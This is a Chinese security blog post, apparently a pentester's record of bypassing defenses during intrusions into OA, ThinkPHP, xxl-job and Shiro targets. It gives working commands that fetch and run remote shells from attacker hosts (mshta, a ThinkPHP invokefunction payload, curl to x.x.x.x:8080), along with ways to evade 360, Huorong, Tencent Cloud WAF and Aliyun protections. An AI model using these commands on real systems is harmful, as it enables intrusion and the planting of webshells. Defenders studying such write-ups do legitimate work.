@@ -1,0 +1,177 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>一些绕过防护的打点记录 | dandeny's blog</title><meta name="author" content="dandeny"><meta name="copyright" content="dandeny"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="万户OA url重定向当时在hunter收集资产的时候发现favicon.ico是万户OA，实际点进去后跳转到新版的OA系统上，新系统登录界面那些都改了且没有漏洞，访问万户OA地址的时候bp抓包显示302然后重定向到新地址，但实际测试下来发现它就是配置了nginx跳转，旧OA没有删除还在那里，之后利用文件上传的历史漏洞直接getshell  堆叠bypass 360 火绒RCE当时碰到了个sql">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一些绕过防护的打点记录">
+<meta property="og:url" content="http://example.com/2023/11/13/%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E9%98%B2%E6%8A%A4%E7%9A%84%E6%89%93%E7%82%B9%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="dandeny&#39;s blog">
+<meta property="og:description" content="万户OA url重定向当时在hunter收集资产的时候发现favicon.ico是万户OA，实际点进去后跳转到新版的OA系统上，新系统登录界面那些都改了且没有漏洞，访问万户OA地址的时候bp抓包显示302然后重定向到新地址，但实际测试下来发现它就是配置了nginx跳转，旧OA没有删除还在那里，之后利用文件上传的历史漏洞直接getshell  堆叠bypass 360 火绒RCE当时碰到了个sql">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/bg/gcnavZbmepS8d4u.png">
+<meta property="article:published_time" content="2023-11-13T14:03:15.000Z">
+<meta property="article:modified_time" content="2023-11-16T08:57:28.126Z">
+<meta property="article:author" content="dandeny">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/bg/gcnavZbmepS8d4u.png"><link rel="shortcut icon" href="/images/bg/941d9457d1adf41dd8022e5edbc284a1.jpg"><link rel="canonical" href="http://example.com/2023/11/13/%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E9%98%B2%E6%8A%A4%E7%9A%84%E6%89%93%E7%82%B9%E8%AE%B0%E5%BD%95/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '一些绕过防护的打点记录',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-11-16 16:57:28'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/bg/941d9457d1adf41dd8022e5edbc284a1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/images/bg/gcnavZbmepS8d4u.png')"><nav id="nav"><span id="blog-info"><a href="/" title="dandeny's blog"><span class="site-name">dandeny's blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">一些绕过防护的打点记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-13T14:03:15.000Z" title="发表于 2023-11-13 22:03:15">2023-11-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-16T08:57:28.126Z" title="更新于 2023-11-16 16:57:28">2023-11-16</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="一些绕过防护的打点记录"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="万户OA-url重定向"><a href="#万户OA-url重定向" class="headerlink" title="万户OA url重定向"></a>万户OA url重定向</h2><p>当时在hunter收集资产的时候发现<code>favicon.ico</code>是万户OA，实际点进去后跳转到新版的OA系统上，新系统登录界面那些都改了且没有漏洞，访问万户OA地址的时候bp抓包显示302然后重定向到新地址，但实际测试下来发现它就是配置了nginx跳转，旧OA没有删除还在那里，之后利用文件上传的历史漏洞直接getshell</p>
+<p><img src="/images/content/Snipaste_2023-11-15_11-05-45.png" alt="Alt text"></p>
+<h2 id="堆叠bypass-360-火绒RCE"><a href="#堆叠bypass-360-火绒RCE" class="headerlink" title="堆叠bypass 360 火绒RCE"></a>堆叠bypass 360 火绒RCE</h2><p>当时碰到了个<code>sql server</code>的堆叠，而且机器出网能够执行命令并且命令回显。但是<code>tasklist /svc</code>查看进程的时候发现存在360安全卫士+360杀毒+火绒，因为是22年下半年打的，上半年打的时候直接用CS生成HTA文件，然后堆叠执行<code>mshta http://X.X.X.X/XXX.hta</code>不会拦截直接上线。但是过了2~3个月后就拦了。但没有拦截<code>mshta</code>命令，服务器还是能收到请求，估计是识别到了CS的特征所以给拦了，当时使用<a target="_blank" rel="noopener" href="https://github.com/mdsecactivebreach/CACTUSTORCH/blob/master/CACTUSTORCH.hta">CACTUSTORCH</a>模板套CS的马成功上线。</p>
+<p><img src="/images/content/Snipaste_2023-11-15_11-20-02.png" alt="Alt text"></p>
+<p><img src="/images/content/Snipaste_2023-11-15_11-21-18.png" alt="Alt text"></p>
+<h2 id="thinkphp-bypass-disable-function"><a href="#thinkphp-bypass-disable-function" class="headerlink" title="thinkphp bypass disable_function"></a>thinkphp bypass disable_function</h2><p>当时的环境是<code>thinkphp5.1.0，php7.2</code>，用工具扫出来存在漏洞，但是执行不了命令，使用POC查看phpinfo后发现disable_function禁用了大多数函数，后面发现网站是用宝塔搭建的网站，disable_function其实就是宝塔面板添加的。禁用的函数中没用禁用文件操作的函数，可以使用<code>file_put_contents，file_get_contents</code>函数，然后服务器上放个马，利用<code>file_get_contents</code>请求写入文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][0]=index111.php&amp;vars[1][1]=&lt;?=file_put_contents(&#x27;111.php&#x27;,file_get_contents(&#x27;https://www.hack.com/xxx.js&#x27;));?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>访问的时候发现尖括号被转义了，上网查找发现使用<code>copy</code>可以绕过这个限制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=copy&amp;vars[1][0]= https://www.hack.com/xxx.js&amp;vars[1][1]=222.php</span><br></pre></td></tr></table></figure>
+
+<p>这次直接找不到222.php这个文件了，但是服务器接收到了请求。将php后缀改成txt文件就能落地，猜测应该是服务器上的防护软件检测到webshell然后删了，后面使用<code>&lt;?php include &quot;222.txt&quot;;&gt;</code>包含txt文件马成功绕过。</p>
+<p><img src="/images/content/Snipaste_2023-11-15_14-46-11.png" alt="Alt text"></p>
+<h2 id="xxl-job绕过腾讯云waf"><a href="#xxl-job绕过腾讯云waf" class="headerlink" title="xxl-job绕过腾讯云waf"></a>xxl-job绕过腾讯云waf</h2><p>前期打点找到xxl-job，了解过xxl-job的就知道xxl-job后台有个计划任务调度。比若依的计划任务调度更简单，创建个shell-gui就能在上面执行命令了。但是这次遇到的是台云主机，有腾讯云waf拦截。直接执行一些高危的命令会被拦截，但是它没有完全拦死。比如你直接使用<code>curl</code>等高危命令去下载文件就会被拦，但是一些命令它不会拦截例如<code>chmod、echo</code>，这时候方法就出来了，先用echo将下载命令写入个文件中，然后赋予这个文件权限，然后执行这个文件去下载我们的shell，最后赋予shell执行权限并执行它就行了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;curl &quot;</span> &gt;&gt; 1.sh</span><br><span class="line"><span class="comment">#因为识别的是下载的完整命令所以如果不完整的下载命令waf不会拦截，所以这里echo要分开写</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;x.x.x.x:8080/shell -o shell&quot;</span> &gt;&gt; 1.sh</span><br><span class="line"><span class="built_in">chmod</span> +x 1.sh</span><br><span class="line">1.sh</span><br><span class="line"><span class="built_in">chmod</span> +x shell</span><br><span class="line"><span class="built_in">nohup</span> ./shell &amp;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-11-15_17-30-25.png" alt="Alt text"></p>
+<p><img src="/images/content/Snipaste_2023-11-15_17-32-27.png" alt="Alt text"></p>
+<h2 id="shiro反序列化不完整的绕过阿里云盾"><a href="#shiro反序列化不完整的绕过阿里云盾" class="headerlink" title="shiro反序列化不完整的绕过阿里云盾"></a>shiro反序列化不完整的绕过阿里云盾</h2><p>当时的情况是可以执行命令、有回显，刚开始执行<code>whoami</code>命令时还可以执行，执行了两遍过后就给我跳出经典的405，不让执行了。只能执行一些冷门的命令像<code>hostname -I</code>来查IP而不是用<code>ifconfig</code>。并且<code>&#39;&gt;&#39;，&#39;|&#39;，&#39;&amp;&#39;</code>等一些特殊字符都不能使用，导致写入文件等操作都做不到。后来我发现只要执行命令时加入绝对路径执行就能绕过防御，像<code>whoami</code>只要用<code>/usr/bin/whoami</code>就能够绕过执行，可以使用<code>which</code>找到命令位置，它也没有被拦。</p>
+<p>所以我就用<code>/usr/bin/curl x.x.x.x:8080/shell -o /tmp/shell</code>下载shell，之后想用<code>/usr/bin/chmod</code>赋予shell执行权限结果死活不行，看来<code>chmod</code>命令被重点防范着。好在<code>/bin/bash</code>可以执行，我将<code>chmod +x /tmp/shell</code>的命令保存到文件上，然后下载到服务器执行命令<code>/bin/bash /tmp/1.sh</code>，这时shell就有执行权限能够执行。但是没想到服务器上还有防护软件，导致我用MSF生成的shell一连接上就断了。然后我以为它可能重点防范TCP流量，换了https的shell结果还是同样的情况。想到既然是阿里云上的服务器那我是不是可以写<code>authorized_keys</code>上去，结果我扫了它公网的全端口发现没开一个端口，估计是开了IP白名单。之后又尝试写计划任务弹回shell，也没弹回来。我开始以为计划任务写错了，就写个计划1分钟后在&#x2F;tmp目录下生成个test文件才发现计划任务根本没执行。</p>
+<p>然后我想到了前段时间看到的安骑士天然C2，又或者开个软链接后门，但是只是个tomcat的权限，都要root权限才能执行。这时候我想在换个C2工具传个shell上去，毕竟MSF特征太明显了。结果<code>curl</code>不能执行了，换了好几个绝对路径也不行了，<code>wget</code>自然也不行。再看了下&#x2F;tmp文件夹下的东西全被删了，我以为是把我vps的IP给ban了，换了个vps后发现它是将整条利用链给ban了，只能说现在的防护软件挺强的能够自动学习是最骚的，最后只能不了了之了。</p>
+<p><img src="/images/content/Snipaste_2023-11-16_10-51-38.png" alt="Alt text"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">dandeny</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/11/13/%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E9%98%B2%E6%8A%A4%E7%9A%84%E6%89%93%E7%82%B9%E8%AE%B0%E5%BD%95/">http://example.com/2023/11/13/%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E9%98%B2%E6%8A%A4%E7%9A%84%E6%89%93%E7%82%B9%E8%AE%B0%E5%BD%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">dandeny's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/images/bg/gcnavZbmepS8d4u.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/11/14/%E6%9F%90%E7%A7%91%E6%8A%80%E8%82%A1%E4%BB%BD%E5%85%AC%E5%8F%B8HW%E5%B0%8F%E7%BB%93/" title="某科技股份公司HW小结"><img class="cover" src="/images/bg/71wgohfPHqXRbG9.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">某科技股份公司HW小结</div></div></a></div><div class="next-post pull-right"><a href="/2023/11/12/%E4%B8%80%E4%BA%9B%E6%84%8F%E5%A4%96%E6%89%93%E7%82%B9%E8%AE%B0%E5%BD%95/" title="一些意外打点记录"><img class="cover" src="/images/bg/53eTB2uiNRlXwFP.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">一些意外打点记录</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/bg/941d9457d1adf41dd8022e5edbc284a1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">dandeny</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/sdandeny"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%87%E6%88%B7OA-url%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">1.</span> <span class="toc-text">万户OA url重定向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0bypass-360-%E7%81%AB%E7%BB%92RCE"><span class="toc-number">2.</span> <span class="toc-text">堆叠bypass 360 火绒RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#thinkphp-bypass-disable-function"><span class="toc-number">3.</span> <span class="toc-text">thinkphp bypass disable_function</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xxl-job%E7%BB%95%E8%BF%87%E8%85%BE%E8%AE%AF%E4%BA%91waf"><span class="toc-number">4.</span> <span class="toc-text">xxl-job绕过腾讯云waf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8D%E5%AE%8C%E6%95%B4%E7%9A%84%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%BE"><span class="toc-number">5.</span> <span class="toc-text">shiro反序列化不完整的绕过阿里云盾</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/11/14/%E6%9F%90%E7%A7%91%E6%8A%80%E8%82%A1%E4%BB%BD%E5%85%AC%E5%8F%B8HW%E5%B0%8F%E7%BB%93/" title="某科技股份公司HW小结"><img src="/images/bg/71wgohfPHqXRbG9.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="某科技股份公司HW小结"/></a><div class="content"><a class="title" href="/2023/11/14/%E6%9F%90%E7%A7%91%E6%8A%80%E8%82%A1%E4%BB%BD%E5%85%AC%E5%8F%B8HW%E5%B0%8F%E7%BB%93/" title="某科技股份公司HW小结">某科技股份公司HW小结</a><time datetime="2023-11-14T02:33:45.000Z" title="发表于 2023-11-14 10:33:45">2023-11-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/13/%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E9%98%B2%E6%8A%A4%E7%9A%84%E6%89%93%E7%82%B9%E8%AE%B0%E5%BD%95/" title="一些绕过防护的打点记录"><img src="/images/bg/gcnavZbmepS8d4u.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="一些绕过防护的打点记录"/></a><div class="content"><a class="title" href="/2023/11/13/%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E9%98%B2%E6%8A%A4%E7%9A%84%E6%89%93%E7%82%B9%E8%AE%B0%E5%BD%95/" title="一些绕过防护的打点记录">一些绕过防护的打点记录</a><time datetime="2023-11-13T14:03:15.000Z" title="发表于 2023-11-13 22:03:15">2023-11-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/12/%E4%B8%80%E4%BA%9B%E6%84%8F%E5%A4%96%E6%89%93%E7%82%B9%E8%AE%B0%E5%BD%95/" title="一些意外打点记录"><img src="/images/bg/53eTB2uiNRlXwFP.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="一些意外打点记录"/></a><div class="content"><a class="title" href="/2023/11/12/%E4%B8%80%E4%BA%9B%E6%84%8F%E5%A4%96%E6%89%93%E7%82%B9%E8%AE%B0%E5%BD%95/" title="一些意外打点记录">一些意外打点记录</a><time datetime="2023-11-12T12:05:35.000Z" title="发表于 2023-11-12 20:05:35">2023-11-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/11/%E8%87%AA%E5%BB%BAdnslog%E5%B9%B3%E5%8F%B0%E6%90%AD%E9%85%8Dbp%E6%8F%92%E4%BB%B6/" title="自建dnslog平台搭配bp插件"><img src="/images/bg/gcnavZbmepS8d4u.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="自建dnslog平台搭配bp插件"/></a><div class="content"><a class="title" href="/2023/11/11/%E8%87%AA%E5%BB%BAdnslog%E5%B9%B3%E5%8F%B0%E6%90%AD%E9%85%8Dbp%E6%8F%92%E4%BB%B6/" title="自建dnslog平台搭配bp插件">自建dnslog平台搭配bp插件</a><time datetime="2023-11-11T13:03:17.000Z" title="发表于 2023-11-11 21:03:17">2023-11-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/10/zerologon%E5%A4%8D%E7%8E%B0/" title="zerologon复现"><img src="/images/bg/xthHmnbdNerWOqP.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="zerologon复现"/></a><div class="content"><a class="title" href="/2023/11/10/zerologon%E5%A4%8D%E7%8E%B0/" title="zerologon复现">zerologon复现</a><time datetime="2023-11-10T12:05:35.000Z" title="发表于 2023-11-10 20:05:35">2023-11-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By dandeny</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
